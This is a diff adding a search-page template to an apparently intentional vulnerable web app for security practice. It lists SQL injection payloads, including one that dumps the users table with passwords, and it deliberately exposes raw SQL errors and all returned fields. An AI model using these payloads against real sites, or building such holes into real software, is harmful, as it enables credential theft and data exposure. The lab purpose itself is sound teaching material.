@@ -1,0 +1,68 @@
+<%- include('partials/header') %>
+
+<div class="section">
+  <div class="page-header">
+    <h2>Search Posts</h2>
+    <div class="vuln-badge sqli">SQL Injection Point</div>
+  </div>
+
+  <div class="card">
+    <form method="GET" action="/search">
+      <div class="form-group inline">
+        <input type="text" name="q" value="<%= q %>" placeholder="Search posts..." autocomplete="off">
+        <button type="submit" class="btn btn-primary">Search</button>
+      </div>
+    </form>
+
+    <div class="exploit-box">
+      <h4>UNION-Based SQL Injection</h4>
+      <div class="payload-list">
+        <div class="payload">
+          <span class="payload-label">Dump users table:</span>
+          <code>' UNION SELECT id,username,password,email,role,bio,avatar,created_at FROM users --</code>
+        </div>
+        <div class="payload">
+          <span class="payload-label">Error-based:</span>
+          <code>'</code>
+          <span class="payload-hint">(single quote causes SQL error)</span>
+        </div>
+        <div class="payload">
+          <span class="payload-label">Always-true:</span>
+          <code>' OR '1'='1</code>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <% if (sqlError) { %>
+    <div class="alert error">
+      <strong>SQL Error (information disclosure):</strong><br>
+      <code><%= sqlError %></code>
+    </div>
+  <% } %>
+
+  <% if (q) { %>
+    <h3>Results for: <em>"<%= q %>"</em> (<%= results.length %> found)</h3>
+    <% if (results.length === 0) { %>
+      <p class="empty">No results found.</p>
+    <% } %>
+    <% results.forEach(r => { %>
+      <div class="card post-card">
+        <% if (r.title) { %>
+          <h3><%= r.title %></h3>
+        <% } %>
+        <% if (r.content) { %>
+          <p><%= r.content %></p>
+        <% } %>
+        <!-- Dump output: other fields -->
+        <% Object.entries(r).forEach(([k,v]) => { %>
+          <% if (!['id','title','content','created_at','user_id'].includes(k) && v) { %>
+            <div class="dump-field"><span><%= k %>:</span> <code><%= v %></code></div>
+          <% } %>
+        <% }) %>
+      </div>
+    <% }) %>
+  <% } %>
+</div>
+
+<%- include('partials/footer') %>
